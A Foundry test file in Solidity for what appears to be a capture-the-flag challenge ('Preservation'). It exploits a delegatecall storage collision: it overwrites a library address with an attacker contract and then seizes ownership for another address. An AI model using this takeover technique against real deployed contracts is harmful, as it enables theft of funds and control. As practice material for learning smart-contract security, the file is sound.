// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Preservation, LibraryContract} from "../src/challenge-16-preservation/Preservation.sol";
import {PreservationAttacker} from "../src/challenge-16-preservation/PreservationAttacker.sol";

contract PreservationTest is Test {
    Preservation public preservation;
    LibraryContract public timeZone1Library;
    LibraryContract public timeZone2Library;
    PreservationAttacker public attacker;

    address public USER = makeAddr("user");

    function setUp() public {
        timeZone1Library = new LibraryContract();
        timeZone2Library = new LibraryContract();
        preservation = new Preservation(address(timeZone1Library), address(timeZone2Library));
        attacker = new PreservationAttacker();
    }

    function testAttack() public {
        preservation.setFirstTime(uint256(uint160(address(attacker))));
        // Let's make sure that the library address was changed
        assertEq(preservation.timeZone1Library(), address(attacker));

        // Now let's call setFirstTime again, but this time the delegatecall
        // will execute the attacker's setTime() function
        vm.prank(USER);
        preservation.setFirstTime(uint256(0));

        // Now let's verify that USER became the owner
        assertEq(preservation.owner(), USER);
    }
}
